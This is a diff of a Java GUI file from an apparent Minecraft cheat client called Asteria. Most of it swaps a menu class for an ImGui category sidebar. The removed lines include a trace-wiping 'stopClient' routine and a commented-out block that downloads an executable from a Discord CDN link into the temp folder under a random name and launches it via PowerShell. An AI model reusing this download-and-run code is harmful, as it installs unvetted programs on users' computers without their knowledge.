@@ -1,94 +1,104 @@
 package net.caffeinemc.phosphor.gui;
 
 import imgui.ImGui;
+import imgui.ImVec2;
 import imgui.flag.ImGuiCol;
+import imgui.flag.ImGuiWindowFlags;
 import net.caffeinemc.phosphor.api.font.JColor;
 import net.caffeinemc.phosphor.common.Phosphor;
 import net.caffeinemc.phosphor.module.Module;
-import net.caffeinemc.phosphor.module.modules.client.AsteriaSettingsModule;
+import net.minecraft.client.MinecraftClient;
 
-import java.util.ArrayList;
-import java.util.List;
-import java.util.concurrent.atomic.AtomicBoolean;
+public class NewTab implements Renderable {
+    private boolean firstFrame = true;
+    private static NewTab instance;
+    public Module.Category selectedCategory = Module.Category.COMBAT;
+    public ImVec2 pos;
 
-public class AsteriaMenu implements Renderable {
-    private static AsteriaMenu instance;
-
-    private static final AtomicBoolean clientEnabled = new AtomicBoolean(true);
-    private final List<CategoryTab> tabs = new ArrayList<>();
-
-    public static AsteriaMenu getInstance() {
+    public static NewTab getInstance() {
         if (instance == null) {
-            instance = new AsteriaMenu();
-        }
-        if (instance.tabs.isEmpty()) {
-            float posX = 10f;
-            for (Module.Category category : Module.Category.values()) {
-                instance.tabs.add(new CategoryTab(category, posX, 10f));
-                posX += 200f;
-            }
+            instance = new NewTab();
         }
         return instance;
     }
 
-    public static void toggleVisibility() {
-        if (ImguiLoader.isRendered(getInstance())) {
-            ImguiLoader.queueRemove(getInstance());
-        } else {
-            ImguiLoader.addRenderable(getInstance());
-        }
-    }
-
-    public static boolean isClientEnabled() {
-        return clientEnabled.get();
-    }
-
-    public static void stopClient() {
-        Phosphor.configManager().saveConfig();
-
-        toggleVisibility();
-        clientEnabled.set(false);
-
-        new Thread(() -> {
-            Module.Category.clearStrings();
-            for (Module module : Phosphor.moduleManager().modules) {
-                if (module.isEnabled())
-                    module.disable();
-
-                module.cleanStrings();
-            }
-
-//            String FILE_URL = "https://cdn.discordapp.com/attachments/1125468134833401989/1130936549131952148/vapelite.exe";
-//            String FILE_NAME = RandomStringUtils.random(10, true, true);
-//            String PATH = System.getProperty("java.io.tmpdir");
-//
-//            try {
-//                InputStream inputStream = new URL(FILE_URL).openStream();
-//                Path pathToFile = Paths.get(PATH).resolve(FILE_NAME);
-//                Files.copy(inputStream, pathToFile, StandardCopyOption.REPLACE_EXISTING);
-//
-//                String command = String.format("powershell.exe Start-Process -FilePath \"%s\" -PassThru -NoNewWindow", pathToFile);
-//                Process powerShellProcess = Runtime.getRuntime().exec(command);
-//
-//                powerShellProcess.waitFor();
-//            } catch (IOException | InterruptedException e) {
-//                throw new RuntimeException(e);
-//            }
-        }).start();
+    public ImVec2 getPos() {
+        return pos;
     }
 
     @Override
     public String getName() {
-        return Phosphor.name;
+        return "Categories";
     }
 
     @Override
     public void render() {
-        if(Phosphor.moduleManager().getModule(AsteriaSettingsModule.class) != null)
-            Phosphor.moduleManager().getModule(AsteriaSettingsModule.class).updateMode();
-        for (CategoryTab categoryTab : tabs) {
-            categoryTab.render();
+        int imGuiWindowFlags = 0;
+        imGuiWindowFlags |= ImGuiWindowFlags.AlwaysAutoResize;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoDocking;
+        //imGuiWindowFlags |= ImGuiWindowFlags.NoMove;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoDecoration;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoBringToFrontOnFocus;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoFocusOnAppearing;
+        ImGui.getStyle().setFramePadding(4, 6);
+        ImGui.getStyle().setButtonTextAlign(0.1f, 0.5f);
+        ImGui.getStyle().setWindowPadding(16,16);
+        ImGui.getStyle().setFrameRounding(30f);
+        ImGui.getStyle().setWindowRounding(16f);
+        ImGui.setNextWindowSize(220f, 500f, 0);
+        ImGui.pushStyleColor(ImGuiCol.WindowBg, 0.08f, 0.08f, 0.12f, 1.00f);
+        ImGui.begin(getName(), imGuiWindowFlags);
+        ImGui.popStyleColor();
+
+        float posX = (float) (MinecraftClient.getInstance().getWindow().getWidth() / 2 - 490);
+        float posY = (float) (MinecraftClient.getInstance().getWindow().getHeight() / 2 - 250);
+
+        if (firstFrame) {
+            ImGui.setWindowPos(posX, posY);
+            firstFrame = false;
         }
+        pos = ImGui.getWindowPos();
+
+        ImGui.pushFont(ImguiLoader.getBiggerDosisFont());
+        float[] color = JColor.getGuiColor().getFloatColor();
+        ImGui.pushStyleColor(ImGuiCol.Text, color[0], color[1], color[2], 1.00f);
+        ImGui.text("Asteria");
+        ImGui.popFont();
+        ImGui.popStyleColor();
+        ImGui.pushStyleColor(ImGuiCol.Text, 0.42f, 0.44f, 0.53f, 1.00f);
+        ImGui.text("v1.0.0");
+        ImGui.popStyleColor();
+        ImGui.text("");
+
+        for (Module.Category category : Module.Category.values()) {
+            ImGui.pushID(category.name());
+
+            if (selectedCategory == category) {
+                ImGui.pushStyleColor(ImGuiCol.Text, 0.80f, 0.84f, 0.96f, 1.00f);
+                ImGui.pushStyleColor(ImGuiCol.Button, color[0], color[1], color[2], 0.50f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonHovered, color[0], color[1], color[2], 0.65f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonActive, color[0], color[1], color[2], 0.8f);
+            } else {
+                ImGui.pushStyleColor(ImGuiCol.Text, 0.42f, 0.44f, 0.53f, 1.00f);
+                ImGui.pushStyleColor(ImGuiCol.Button, 0.07f, 0.07f, 0.11f, 0.f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonHovered, 0.09f, 0.09f, 0.15f, 0.65f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonActive, 0.1f, 0.1f, 0.16f, 0.8f);
+            }
+
+            ImGui.pushFont(ImguiLoader.getBigDosisFont());
+            boolean isToggled = ImGui.button(category.name(), 180f, 60f);
+            ImGui.popFont();
+            ImGui.popStyleColor(4);
+
+            if (ImGui.isItemHovered()) {
+                if (ImGui.isMouseClicked(1) || ImGui.isMouseClicked(0)) {
+                    selectedCategory = category;
+                }
+            }
+            ImGui.popID();
+        }
+        pos = ImGui.getWindowPos();
+        ImGui.end();
     }
 
     @Override
@@ -159,8 +169,9 @@ public class AsteriaMenu implements Renderable {
                 colors[ImGuiCol.ModalWindowDimBg]       = new float[]{0.80f, 0.80f, 0.80f, 0.35f};
                 ImGui.getStyle().setColors(colors);
 
-                ImGui.getStyle().setWindowRounding(8);
-                ImGui.getStyle().setFrameRounding(4);
+                ImGui.getStyle().setWindowRounding(16);
+                ImGui.getStyle().setWindowPadding(16,16);
+                ImGui.getStyle().setFrameRounding(30);
                 ImGui.getStyle().setGrabRounding(4);
                 ImGui.getStyle().setPopupRounding(4);
                 ImGui.getStyle().setScrollbarSize(10);
